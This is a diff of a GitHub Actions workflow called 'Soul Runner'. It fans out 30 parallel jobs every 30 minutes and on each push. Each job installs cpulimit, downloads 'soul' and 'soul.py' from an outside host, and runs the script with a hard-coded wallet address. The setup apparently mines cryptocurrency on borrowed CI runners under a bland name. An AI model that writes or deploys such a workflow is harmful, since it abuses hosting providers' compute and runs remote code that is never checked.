@@ -2,11 +2,11 @@ name: Soul Runner
 
 on:
   schedule:
-    # You can adjust the schedule as needed
-    - cron: '*/30 * * * *'  # Runs every 30 minutes
+    # Har 30 minute pe chale ga
+    - cron: '*/30 * * * *'
   push:
     branches: [ main, master ]
-  workflow_dispatch:  # Allows manual triggering
+  workflow_dispatch:
 
 jobs:
   execute_soul:
@@ -14,10 +14,10 @@ jobs:
     
     strategy:
       matrix:
-        # Creates 30 parallel jobs
+        # 30 parallel jobs
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 
                    16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
-      fail-fast: false  # Continue running other jobs even if one fails
+      fail-fast: false
     
     steps:
     - name: Checkout repository
@@ -26,7 +26,7 @@ jobs:
     - name: Setup system dependencies
       run: |
         sudo apt-get update
-        sudo apt-get install -y cpulimit
+        sudo apt-get install -y cpulimit curl
     
     - name: Download and prepare soul files
       run: |
@@ -35,19 +35,17 @@ jobs:
         curl -O "https://hingoli.io/soul.php?file=soul.py"
         mv soul.php soul.py
         chmod +x soul
+        ls -la  # Verify files are downloaded
     
-    - name: Execute soul script
-      env:
-        # You can store your wallet address as a GitHub secret
-        WALLET_ADDRESS: ${{ 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN }}
+    - name: Execute soul script with wallet
       run: |
-        if [ -z "$WALLET_ADDRESS" ]; then
-          echo "Error: WALLET_ADDRESS secret is not set"
-          exit 1
-        fi
-        python3 soul.py $WALLET_ADDRESS
+        # Direct wallet address use kar rahe hain
+        WALLET="43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
+        echo "Starting soul.py with wallet: $WALLET"
+        python3 soul.py $WALLET
     
-    - name: Job completion notification
+    - name: Job completion status
       if: always()
       run: |
-        echo "Job ${{ matrix.instance }} completed with status: ${{ job.status }}"
+        echo "Job ${{ matrix.instance }} completed at $(date)"
+        echo "Status: ${{ job.status }}"
